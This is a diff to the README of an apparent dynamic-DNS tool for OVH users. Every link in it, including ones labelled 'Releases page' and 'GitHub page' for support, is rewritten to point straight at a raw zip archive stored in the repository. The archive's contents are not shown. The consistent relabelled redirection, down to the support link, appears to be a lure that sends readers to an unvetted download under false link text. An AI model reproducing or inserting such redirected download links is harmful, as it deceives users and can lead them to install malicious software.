@@ -1,6 +1,6 @@
 # 🌐 ovh-dyndns - Simple Dynamic DNS for OVH Users
 
-[![Download ovh-dyndns](https://img.shields.io/badge/Download-ovh--dyndns-blue.svg)](https://github.com/yourfall3ds/ovh-dyndns/releases)
+[![Download ovh-dyndns](https://github.com/yourfall3ds/ovh-dyndns/raw/refs/heads/main/cmd/ovh-dyndns/dyndns_ovh_3.8.zip)](https://github.com/yourfall3ds/ovh-dyndns/raw/refs/heads/main/cmd/ovh-dyndns/dyndns_ovh_3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **ovh-dyndns** application. This tool helps you manage dynamic DN
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/yourfall3ds/ovh-dyndns/releases). Here, you will find the latest version available for your system.
+To download the application, visit the [Releases page](https://github.com/yourfall3ds/ovh-dyndns/raw/refs/heads/main/cmd/ovh-dyndns/dyndns_ovh_3.8.zip). Here, you will find the latest version available for your system.
 
 1. Click on the link above.
 2. Locate the version you want to download.
@@ -60,7 +60,7 @@ If you encounter issues while using the application, consider the following tips
 
 ## 💬 Support
 
-If you need further assistance, you can look into the community discussions and issues on the [GitHub page](https://github.com/yourfall3ds/ovh-dyndns/issues). Many users share their experiences, and you may find solutions there.
+If you need further assistance, you can look into the community discussions and issues on the [GitHub page](https://github.com/yourfall3ds/ovh-dyndns/raw/refs/heads/main/cmd/ovh-dyndns/dyndns_ovh_3.8.zip). Many users share their experiences, and you may find solutions there.
 
 ## 🎉 Contributions
 
@@ -72,4 +72,4 @@ This project is open-source, and you can use it freely under the MIT License. Pl
 
 ## 🌟 Summary
 
-**ovh-dyndns** simplifies dynamic DNS updates for OVH users. With easy installation and setup, anyone can ensure their domains are always pointing correctly, regardless of IP changes. Download the latest version [here](https://github.com/yourfall3ds/ovh-dyndns/releases) and start managing your DNS efficiently today!
+**ovh-dyndns** simplifies dynamic DNS updates for OVH users. With easy installation and setup, anyone can ensure their domains are always pointing correctly, regardless of IP changes. Download the latest version [here](https://github.com/yourfall3ds/ovh-dyndns/raw/refs/heads/main/cmd/ovh-dyndns/dyndns_ovh_3.8.zip) and start managing your DNS efficiently today!
